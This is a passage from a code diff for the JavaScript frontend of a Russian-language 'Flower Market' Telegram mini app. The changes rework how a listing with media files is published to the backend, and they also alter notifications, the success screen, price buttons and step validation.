     submitBtn.innerHTML = '<div class="loader"></div> Публикация...';
     submitBtn.disabled = true;
     
+    showNotification('Публикация', 
+        `Отправка объявления с ${mediaFiles.length} файлами...`, 
+        'info');
+    
     try {
-        // Отправляем на бэкенд
-        const result = await publishAd(formData);
+        const endpoint = '/api/publish-media-group';
+        
+        console.log(`📤 Отправка на ${endpoint}...`);
+        
+        const response = await fetch(`${BACKEND_URL}${endpoint}`, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify(formData)
+        });
+        
+        if (!response.ok) {
+            const errorText = await response.text();
+            throw new Error(`HTTP ${response.status}: ${errorText}`);
+        }
+        
+        const result = await response.json();
+        console.log('📥 Результат:', result);
         
         if (result.success) {
-            // Успех!
-            console.log('✅ Публикация успешна!', result);
-            showSuccessScreen(result.postLink);
+            console.log('✅ Успешно опубликовано!');
+            
+            setTimeout(() => {
+                showNotification('✅ Успешно!', 
+                    `Объявление с ${result.mediaCount} файлами опубликовано в одном посте!`, 
+                    'success');
+                
+                setTimeout(() => {
+                    showSuccessScreen(result);
+                }, 1500);
+            }, 1000);
+            
         } else {
-            throw new Error(result.error || 'Неизвестная ошибка публикации');
+            throw new Error(result.error || 'Ошибка публикации');
         }
         
     } catch (error) {
         console.error('❌ Ошибка публикации:', error);
-        showNotification('Ошибка публикации', error.message, 'error');
         
-        // Восстанавливаем кнопку
+        let errorMessage = 'Ошибка при публикации объявления';
+        if (error.message.includes('network') || error.message.includes('fetch')) {
+            errorMessage = 'Ошибка сети. Проверьте подключение к интернету.';
+        }
+        
+        showNotification('Ошибка публикации', errorMessage, 'error');
+        
         submitBtn.innerHTML = originalText;
         submitBtn.disabled = false;
+        isSubmitting = false;
     }
 }
-
-function getContactInfo() {
-    if (selectedContactType === 'telegram') {
-        const telegram = document.getElementById('telegram').value.trim();
-        return `Telegram: ${telegram.startsWith('@') ? telegram : '@' + telegram}`;
-    } else if (selectedContactType === 'phone') {
-        const phone = document.getElementById('phone').value.trim();
-        return `Телефон: ${phone}`;
-    } else {
-        return 'Контакты в комментариях';
-    }
-}
-
-function updatePreview() {
-    // Фото
-    const previewMedia = document.getElementById('previewMedia');
-    if (previewMedia) {
-        previewMedia.innerHTML = '';
-        mediaFiles.slice(0, 3).forEach(file => {
-            const img = document.createElement('img');
-            img.className = 'photo-preview';
-            img.src = file.url;
-            img.alt = 'Фото объявления';
-            previewMedia.appendChild(img);
-        });
-        
-        if (mediaFiles.length > 3) {
-            const more = document.createElement('div');
-            more.className = 'photo-preview photo-more';
-            more.textContent = `+${mediaFiles.length - 3}`;
-            previewMedia.appendChild(more);
-        }
-    }
-    
-    // Остальные поля
-    document.getElementById('previewDescription').textContent = 
-        document.getElementById('description').value || 'Не указано';
-    
-    document.getElementById('previewPrice').textContent = 
-        document.getElementById('price').value || 'Договорная';
-    
-    document.getElementById('previewContacts').textContent = getContactInfo();
-    
-    const region = document.getElementById('regionSelect').value || '';
-    const city = document.getElementById('citySelect').value || '';
-    const address = document.getElementById('addressInput').value || '';
-    
-    let locationText = '';
-    if (region) locationText += region;
-    if (city) locationText += `, ${city}`;
-    if (address) locationText += ` (${address})`;
-    
-    document.getElementById('previewLocation').textContent = 
-        locationText || 'Не указано';
-}
-
-// ============================================
-// УТИЛИТЫ И УВЕДОМЛЕНИЯ
-// ============================================
 
 function showNotification(title, message, type = 'info') {
     const notification = document.getElementById('notification');
     const titleEl = document.getElementById('notificationTitle');
     const messageEl = document.getElementById('notificationMessage');
+    const iconEl = notification.querySelector('.notification-icon');
     
     if (!notification || !titleEl || !messageEl) return;
     
     titleEl.textContent = title;
     messageEl.textContent = message;
     
-    notification.className = 'notification';
-    notification.classList.add(type);
+    if (iconEl) {
+        if (type === 'success') {
+            iconEl.className = 'notification-icon fas fa-check-circle';
+            notification.classList.add('success');
+        } else if (type === 'error') {
+            iconEl.className = 'notification-icon fas fa-exclamation-circle';
+        } else if (type === 'warning') {
+            iconEl.className = 'notification-icon fas fa-exclamation-triangle';
+        } else {
+            iconEl.className = 'notification-icon fas fa-info-circle';
+        }
+    }
+    
     notification.classList.add('show');
     
     setTimeout(() => {
@@ -442,180 +932,116 @@ function showNotification(title, message, type = 'info') {
     }, 5000);
 }
 
-function showSuccessScreen(postLink) {
-    // Скрываем форму
+function showSuccessScreen(result) {
     document.getElementById('formContainer').style.display = 'none';
+    document.getElementById('successScreen').style.display = 'block';
     
-    // Показываем экран успеха
-    const successScreen = document.getElementById('successScreen');
-    successScreen.style.display = 'block';
+    const photoCount = mediaFiles.filter(f => f.type.startsWith('image/')).length;
+    const videoCount = mediaFiles.filter(f => f.type.startsWith('video/')).length;
+    const mediaText = mediaFiles.length === 1 ? '1 файл' : `${mediaFiles.length} файлов`;
     
-    // Обновляем ссылку
-    const linkElement = document.getElementById('postLink');
-    if (linkElement) {
-        linkElement.href = postLink || '#';
-        linkElement.textContent = postLink 
-            ? 'Перейти к объявлению с комментариями' 
-            : 'Объявление опубликовано';
-    }
+    const successMessage = document.getElementById('successMessageText');
+    successMessage.innerHTML = `
+        Ваше объявление с <strong>${mediaText}</strong> опубликовано в одном посте Telegram.
+        ${photoCount > 0 ? `<br>📸 Фото: ${photoCount}` : ''}
+        ${videoCount > 0 ? `<br>🎬 Видео: ${videoCount}` : ''}
+    `;
     
-    // Обновляем текст о комментариях
-    const successMessage = document.querySelector('.success-message');
-    if (successMessage) {
-        successMessage.innerHTML = `
-            ✅ <b>Объявление успешно опубликовано!</b><br><br>
-            💬 <b>Комментарии автоматически включены</b><br>
-            Покупатели могут задавать вопросы прямо под вашим объявлением в разделе комментариев.
-        `;
-    }
-    
-    // Прокрутка наверх
     window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
-// ============================================
-// ГЛОБАЛЬНЫЕ ФУНКЦИИ (для onclick в HTML)
-// ============================================
-
-// Навигация
-window.nextStep = function() {
-    if (currentStep < 6 && validateCurrentStep()) {
+function nextStep() {
+    if (currentStep < totalSteps && validateCurrentStep()) {
         showStep(currentStep + 1);
-    }
-};
-
-window.prevStep = function() {
-    if (currentStep > 1) {
-        showStep(currentStep - 1);
-    }
-};
-
-// Цена
-window.setNegotiablePrice = function() {
-    const priceInput = document.getElementById('price');
-    const negotiableBtn = document.getElementById('priceBtnNegotiable');
-    const enterBtn = document.getElementById('priceBtnEnter');
-    
-    if (priceInput) priceInput.value = 'Договорная';
-    if (negotiableBtn) negotiableBtn.classList.add('active');
-    if (enterBtn) enterBtn.classList.remove('active');
-    
-    validateCurrentStep();
-};
-
-window.focusPriceInput = function() {
-    const priceInput = document.getElementById('price');
-    const negotiableBtn = document.getElementById('priceBtnNegotiable');
-    const enterBtn = document.getElementById('priceBtnEnter');
-    
-    if (priceInput) {
-        priceInput.value = '';
-        priceInput.readOnly = false;
-        priceInput.focus();
-        priceInput.placeholder = 'Например: 500';
-    }
-    if (negotiableBtn) negotiableBtn.classList.remove('active');
-    if (enterBtn) enterBtn.classList.add('active');
-};
-
-// Контакты
-window.selectContactType = function(type) {
-    selectedContactType = type;
-    
-    // UI кнопок
-    document.querySelectorAll('.contact-option').forEach(opt => {
-        opt.classList.remove('active');
-    });
-    const optionElement = document.getElementById(`${type}Option`);
-    if (optionElement) optionElement.classList.add('active');
-    
-    // Поля ввода
-    const telegramGroup = document.getElementById('telegramInputGroup');
-    const phoneGroup = document.getElementById('phoneInputGroup');
-    
-    if (telegramGroup) telegramGroup.style.display = type === 'telegram' ? 'block' : 'none';
-    if (phoneGroup) phoneGroup.style.display = type === 'phone' ? 'block' : 'none';
-    
-    validateCurrentStep();
-};
-
-// Локация
-window.loadCities = async function(region) {
-    if (!region) return;
-    
-    const citySelect = document.getElementById('citySelect');
-    if (!citySelect) return;
-    
-    const originalValue = citySelect.value;
-    
-    citySelect.innerHTML = '<option value="">Загрузка...</option>';
-    citySelect.disabled = true;
-    
-    const cities = await getCities(region);
-    
-    citySelect.innerHTML = '<option value="">Выберите город/район</option>';
-    cities.forEach(city => {
-        const option = document.createElement('option');
-        option.value = city;
-        option.textContent = city;
-        citySelect.appendChild(option);
-    });
-    
-    // Восстанавливаем значение если оно есть в новом списке
-    if (originalValue && cities.includes(originalValue)) {
-        citySelect.value = originalValue;
-    }
-    
-    citySelect.disabled = false;
-    validateCurrentStep();
-};
-
-// Другие функции
-window.createNewAd = function() {
-    location.reload();
-};
-
-window.closeTelegramApp = function() {
-    if (tg && tg.close) {
-        tg.close();
-    }
-};
-
-window.removeMedia = removeMedia;
-window.submitForm = submitForm;
-
-// ============================================
-// НАСТРОЙКА ОБРАБОТЧИКОВ
-// ============================================
-
-function setupEventListeners() {
-    // Загрузка медиа
-    const mediaInput = document.getElementById('mediaInput');
-    const mediaUpload = document.getElementById('mediaUpload');
-    
-    if (mediaInput && mediaUpload) {
-        mediaUpload.addEventListener('click', () => mediaInput.click());
-        mediaInput.addEventListener('change', handleMediaUpload);
-    }
-    
-    // Автовалидация полей
-    const fields = ['description', 'telegram', 'phone', 'addressInput', 'price'];
-    fields.forEach(fieldId => {
-        const field = document.getElementById(fieldId);
-        if (field) {
-            field.addEventListener('input', () => validateCurrentStep());
-        }
-    });
-    
-    // Регион
-    const regionSelect = document.getElementById('regionSelect');
-    if (regionSelect) {
-        regionSelect.addEventListener('change', function() {
-            if (this.value) {
-                window.loadCities(this.value);
-            }
-        });
     }
 }
 
-console.log('✅ Flower Market Frontend готов к работе!');
+function prevStep() {
+    if (currentStep > 1) {
+        showStep(currentStep - 1);
+    }
+}
+
+function setNegotiablePrice() {
+    document.getElementById('price').value = 'Договорная';
+    document.getElementById('price').readOnly = true;
+    
+    const negotiableBtn = document.getElementById('priceBtnNegotiable');
+    const enterBtn = document.getElementById('priceBtnEnter');
+    
+    negotiableBtn.classList.add('active');
+    enterBtn.classList.remove('active');
+    
+    validateCurrentStep();
+}
+
+function focusPriceInput() {
+    const priceInput = document.getElementById('price');
+    priceInput.value = '';
+    priceInput.readOnly = false;
+    priceInput.focus();
+    priceInput.placeholder = 'Например: 500';
+    
+    const negotiableBtn = document.getElementById('priceBtnNegotiable');
+    const enterBtn = document.getElementById('priceBtnEnter');
+    
+    negotiableBtn.classList.remove('active');
+    enterBtn.classList.add('active');
+    
+    validateCurrentStep();
+}
+
+function createNewAd() {
+    // Очищаем только данные формы
+    mediaFiles = [];
+    currentStep = 1;
+    
+    // Сбрасываем поля формы
+    document.getElementById('description').value = '';
+    document.getElementById('price').value = '';
+    
+    // Сбрасываем UI
+    document.getElementById('mediaPreview').innerHTML = '';
+    document.getElementById('formContainer').style.display = 'block';
+    document.getElementById('successScreen').style.display = 'none';
+    
+    // Показываем экран контактов
+    document.getElementById('contactsScreen').style.display = 'block';
+    document.getElementById('mainContainer').style.display = 'none';
+    
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function getHintIdForStep(step) {
+    const hints = {
+        1: 'mediaHint',
+        2: 'descriptionHint',
+        3: 'priceHint'
+    };
+    return hints[step];
+}
+
+function validateAllSteps() {
+    for (let i = 1; i <= 3; i++) {
+        if (!validateStep(i)) {
+            showStep(i);
+            return false;
+        }
+    }
+    return true;
+}
+
+function validateStep(step) {
+    switch (step) {
+        case 1: return mediaFiles.length > 0;
+        case 2: return document.getElementById('description')?.value.trim().length >= 3;
+        case 3: 
+            const price = document.getElementById('price')?.value || '';
+            const priceBtn = document.getElementById('priceBtnNegotiable');
+            const isNegotiable = priceBtn && priceBtn.classList.contains('active');
+            return isNegotiable || (price && !isNaN(parseFloat(price)) && parseFloat(price) > 0);
+        default: return true;
+    }
+}
+
+console.log('✅ Flower Market Frontend готов!');
